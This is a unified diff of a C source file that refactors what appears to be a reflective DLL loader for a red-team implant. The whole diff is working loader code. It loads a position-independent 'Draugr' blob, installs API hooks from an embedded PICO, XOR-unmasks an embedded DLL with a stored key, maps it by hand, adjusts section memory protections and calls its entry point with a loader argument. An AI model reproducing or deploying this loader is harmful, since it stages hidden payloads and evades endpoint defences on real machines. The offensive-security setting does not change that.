@@ -26,12 +26,7 @@
  * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
 
-void go(void * loaderArgument);
-
-char * loaderStart() {
-    return (char *)go;
-}
-
+#include <windows.h>
 #include "loader.h"
 #include "tp.h"
 #include "proxy.h"
@@ -69,12 +64,14 @@ typedef struct {
     WIN32_FUNC(CreateProcessA);
 } WIN32FUNCS;
 
-char __DRAUGR__[0] __attribute__((section("draugr")));
-char __HOOKS__[0]  __attribute__((section("hooks")));
-char __DLL__[0]    __attribute__((section("dll")));
-char __KEY__[0]    __attribute__((section("key")));
+void go();
 
-void * allocateVirtualMemory(SIZE_T size, ULONG protect)
+char _DRAUGR_[0] __attribute__((section("draugr")));
+char _HOOKS_[0]  __attribute__((section("hooks")));
+char _DLL_[0]    __attribute__((section("dll")));
+char _KEY_[0]    __attribute__((section("key")));
+
+void * AllocateVirtualMemory(SIZE_T size, ULONG protect)
 {
     NTARGS args;
     memset(&args, 0, sizeof(NTARGS));
@@ -94,7 +91,7 @@ void * allocateVirtualMemory(SIZE_T size, ULONG protect)
     return baseAddress;
 }
 
-void protectVirtualMemory(void * baseAddress, SIZE_T size, ULONG newProtect)
+void ProtectVirtualMemory(void * baseAddress, SIZE_T size, ULONG newProtect)
 {
     NTARGS args;
     memset(&args, 0, sizeof(NTARGS));
@@ -111,7 +108,7 @@ void protectVirtualMemory(void * baseAddress, SIZE_T size, ULONG newProtect)
     ProxyNtApi(&args);
 }
 
-void freeVirtualMemory(void * baseAddress)
+void FreeVirtualMemory(void * baseAddress)
 {
     NTARGS args;
     memset(&args, 0, sizeof(NTARGS));
@@ -127,7 +124,7 @@ void freeVirtualMemory(void * baseAddress)
     ProxyNtApi(&args);
 }
 
-void fixSectionPermissions(DLLDATA * dll, char * src, char * dst, MEMORY_REGION * region)
+void FixSectionPermissions(DLLDATA * dll, char * src, char * dst, MEMORY_REGION * region, RDATA_SECTION * rdata)
 {
     DWORD                   numberOfSections = dll->NtHeaders->FileHeader.NumberOfSections;
     IMAGE_SECTION_HEADER  * sectionHdr       = NULL;
@@ -137,7 +134,7 @@ void fixSectionPermissions(DLLDATA * dll, char * src, char * dst, MEMORY_REGION 
 
     sectionHdr  = (IMAGE_SECTION_HEADER *)PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);
 
-    for (int x = 0; x < numberOfSections; x++)
+    for (int i = 0; i < numberOfSections; i++)
     {
         sectionDst  = dst + sectionHdr->VirtualAddress;
         sectionSize = sectionHdr->SizeOfRawData;
@@ -165,115 +162,32 @@ void fixSectionPermissions(DLLDATA * dll, char * src, char * dst, MEMORY_REGION 
         }
 
         /* set new permission */
-        protectVirtualMemory(sectionDst, sectionSize, newProtect);
+        ProtectVirtualMemory(sectionDst, sectionSize, newProtect);
 
         /* track memory */
-        region->sections[x].baseAddress     = sectionDst;
-        region->sections[x].size            = sectionSize;
-        region->sections[x].currentProtect  = newProtect;
-        region->sections[x].previousProtect = newProtect;
+        region->sections[i].baseAddress     = sectionDst;
+        region->sections[i].size            = sectionSize;
+        region->sections[i].currentProtect  = newProtect;
+        region->sections[i].previousProtect = newProtect;
+
+        if (MSVCRT$strncmp((char *)sectionHdr->Name, ".rdata", IMAGE_SIZEOF_SHORT_NAME) == 0)
+        {
+            rdata->start  = sectionDst;
+            rdata->length = sectionSize;
+            rdata->offset = dll->NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size;
+        }
 
         /* advance to our next section */
         sectionHdr++;
     }
 }
 
-void reflectiveLoader(WIN32FUNCS * funcs, MEMORY_LAYOUT * layout, void * loaderArgument)
-{
-    char     * hookSrc;
-    PICO     * hookDst;
-    RESOURCE * keyRes;
-    RESOURCE * dllRes;
-    DLLDATA    dllData;
-    char     * dllSrc;
-    char     * dllDst;
-
-    /* Time to load the hook PICO */
-    hookSrc = GETRESOURCE(__HOOKS__);
-
-    /* Allocate memory for it */
-    hookDst = (PICO *)allocateVirtualMemory(sizeof(PICO), PAGE_READWRITE);
-
-    #if DEBUG
-    dprintf("hookDst      : 0x%p\n", hookDst);
-    dprintf("PicoDataSize : %d\n", PicoDataSize(hookSrc));
-    dprintf("PicoCodeSize : %d\n", PicoCodeSize(hookSrc));
-    #endif
-
-    /* Load it into memory */
-    PicoLoad((IMPORTFUNCS *)funcs, hookSrc, hookDst->code, hookDst->data);
-
-    /* Make the code section RX */
-    protectVirtualMemory(hookDst->code, PicoCodeSize(hookSrc), PAGE_EXECUTE_READ);
-
-    /* Fill layout info */
-    layout->hooks.baseAddress                 = (char *)hookDst;
-    layout->hooks.size                        = sizeof(PICO);
-    layout->hooks.sections[0].baseAddress     = hookDst->data;
-    layout->hooks.sections[0].size            = PicoDataSize(hookSrc);
-    layout->hooks.sections[0].currentProtect  = PAGE_READWRITE;
-    layout->hooks.sections[0].previousProtect = PAGE_READWRITE;
-    layout->hooks.sections[1].baseAddress     = hookDst->code;
-    layout->hooks.sections[1].size            = PicoCodeSize(hookSrc);
-    layout->hooks.sections[1].currentProtect  = PAGE_EXECUTE_READ;
-    layout->hooks.sections[1].previousProtect = PAGE_EXECUTE_READ;
-
-    /* Get PICO entry point */
-    PICOHOOK_ENTRY picoEntry = (PICOHOOK_ENTRY)PicoEntryPoint(hookSrc, hookDst->code);
-
-    /* Call it to install the hooks */
-    picoEntry((IMPORTFUNCS *)funcs, layout);
-
-    /* Get XOR key */
-    keyRes = (RESOURCE *)GETRESOURCE(__KEY__);
-
-    /* Get XOR'd DLL */
-    dllRes = (RESOURCE *)GETRESOURCE(__DLL__);
-
-    /* Unmask and copy it into memory */
-    dllSrc = allocateVirtualMemory(dllRes->length, PAGE_READWRITE);
-
-    for (int i = 0; i < dllRes->length; i++) {
-        dllSrc[i] = dllRes->value[i] ^ keyRes->value[i % keyRes->length];
-    }
-
-    /* Parse the headers */
-    ParseDLL(dllSrc, &dllData);
-
-    /* Allocate memory for DLL */
-    dllDst = allocateVirtualMemory(SizeOfDLL(&dllData), PAGE_READWRITE);
-
-    /* Load it into memory */
-    LoadDLL(&dllData, dllSrc, dllDst);
-    ProcessImports((IMPORTFUNCS *)funcs, &dllData, dllDst);
-
-    layout->dll.baseAddress = dllDst;
-    layout->dll.size        = SizeOfDLL(&dllData);
-
-    /* Fix section memory permissions */
-    fixSectionPermissions(&dllData, dllSrc, dllDst, &layout->dll);
-
-    /* Call hook entry point again to provide the updated memory layout */
-    picoEntry((IMPORTFUNCS *)funcs, layout);
-
-    /* Get its entry point */
-    DLLMAIN_FUNC dllEntry = EntryPoint(&dllData, dllDst);
-
-    /* Free the unmasked copy */
-    freeVirtualMemory(dllSrc);
-
-    /* Call it twice */
-    dllEntry((HINSTANCE)dllDst, DLL_PROCESS_ATTACH, NULL);
-    dllEntry((HINSTANCE)loaderStart(), 0x4, loaderArgument);
-}
-
 void go(void * loaderArgument)
 {
-    WIN32FUNCS      funcs;
-    RESOURCE      * picSrc;
-    char          * picDst;
-    MEMORY_LAYOUT   layout;
+    WIN32FUNCS funcs;
+    memset(&funcs, 0, sizeof(WIN32FUNCS));
 
+    /* set funcs */
     funcs.LoadLibraryA       = LoadLibraryA;
     funcs.GetProcAddress     = GetProcAddress;
     funcs.LoadLibraryW       = KERNEL32$LoadLibraryW;
@@ -302,29 +216,85 @@ void go(void * loaderArgument)
     funcs.WriteProcessMemory = KERNEL32$WriteProcessMemory;
     funcs.CreateProcessA     = KERNEL32$CreateProcessA;
 
-    /* Grab the Draugr PIC */
-    picSrc = (RESOURCE *)GETRESOURCE(__DRAUGR__);
+    MEMORY_LAYOUT layout;
+    memset(&layout, 0, sizeof(MEMORY_LAYOUT));
 
-    /* Allocate memory for it */
-    picDst = allocateVirtualMemory(picSrc->length, PAGE_READWRITE);
+    /* get draugr pic */
+    RESOURCE * draugr = (RESOURCE *)GETRESOURCE(_DRAUGR_);
 
-    #if DEBUG
-    dprintf("picDst : 0x%p\n", picDst);
-    #endif
+    /* load it into memory */
+    char * pic = AllocateVirtualMemory(draugr->length, PAGE_READWRITE);
+    memcpy(pic, draugr->value, draugr->length);
+    ProtectVirtualMemory(pic, draugr->length, PAGE_EXECUTE_READ);
 
-    /* Copy it into memory */
-    memcpy(picDst, picSrc->value, picSrc->length);
+    layout.pic.baseAddress = pic;
+    layout.pic.size        = draugr->length;
 
-    /* Flip memory to RX */
-    protectVirtualMemory(picDst, picSrc->length, PAGE_EXECUTE_READ);
+    funcs.Draugr = (DRAUGR)(pic);
 
-    /* Set funcs field */
-    funcs.Draugr = (DRAUGR)(picDst);
+    /* get hooking pico */
+    char * hooks = GETRESOURCE(_HOOKS_);
 
-    /* Begin filling memory layout info */
-    layout.pic.baseAddress    = picDst;
-    layout.pic.size           = picSrc->length;
+    /* load it into memory */
+    PICO * pico = (PICO *)AllocateVirtualMemory(sizeof(PICO), PAGE_READWRITE);
+    PicoLoad((IMPORTFUNCS *)&funcs, hooks, pico->code, pico->data);
+    ProtectVirtualMemory(pico->code, PicoCodeSize(hooks), PAGE_EXECUTE_READ);
 
-    /* Carry on loading the rest */
-    reflectiveLoader(&funcs, &layout, loaderArgument);
+    /* record layout */
+    layout.hooks.baseAddress                 = (char *)(pico);
+    layout.hooks.size                        = sizeof(PICO);
+    layout.hooks.sections[0].baseAddress     = pico->data;
+    layout.hooks.sections[0].size            = PicoDataSize(hooks);
+    layout.hooks.sections[0].currentProtect  = PAGE_READWRITE;
+    layout.hooks.sections[0].previousProtect = PAGE_READWRITE;
+    layout.hooks.sections[1].baseAddress     = pico->code;
+    layout.hooks.sections[1].size            = PicoCodeSize(hooks);
+    layout.hooks.sections[1].currentProtect  = PAGE_EXECUTE_READ;
+    layout.hooks.sections[1].previousProtect = PAGE_EXECUTE_READ;
+
+    /* get pico entry point */
+    PICOHOOK_ENTRY picoEntry = (PICOHOOK_ENTRY)PicoEntryPoint(hooks, pico->code);
+
+    /* call it to install the hooks */
+    picoEntry((IMPORTFUNCS *)&funcs, &layout);
+
+    /* get the masked dll and key */
+    RESOURCE * dll = (RESOURCE *)GETRESOURCE(_DLL_);
+    RESOURCE * key = (RESOURCE *)GETRESOURCE(_KEY_);
+
+    /* unmask the dll into memory */
+    char * src = AllocateVirtualMemory(dll->length, PAGE_READWRITE);
+    for (int i = 0; i < dll->length; i++) {
+        src[i] = dll->value[i] ^ key->value[i % key->length];
+    }
+
+    /* parse dll header */
+    DLLDATA data;
+    ParseDLL(src, &data);
+
+    /* loader it into memory */
+    char * dst = AllocateVirtualMemory(SizeOfDLL(&data), PAGE_READWRITE);
+
+    LoadDLL(&data, src, dst);
+    ProcessImports((IMPORTFUNCS *)&funcs, &data, dst);
+
+    layout.dll.baseAddress = dst;
+    layout.dll.size        = SizeOfDLL(&data);
+
+    RDATA_SECTION rdata;
+    memset(&rdata, 0, sizeof(RDATA_SECTION));
+    FixSectionPermissions(&data, src, dst, &layout.dll, &rdata);
+
+    /* call hook pico again to provide the updated memory layout */
+    picoEntry((IMPORTFUNCS *)&funcs, &layout);
+
+    /* get entry point */
+    DLLMAIN_FUNC dllMain = EntryPoint(&data, dst);
+
+    /* free unmasked copy */
+    FreeVirtualMemory(src);
+
+    /* call entry point */
+    dllMain((HINSTANCE)dst, DLL_PROCESS_ATTACH, NULL);
+    dllMain((HINSTANCE)GETRESOURCE(go), 0x4, loaderArgument);
 }
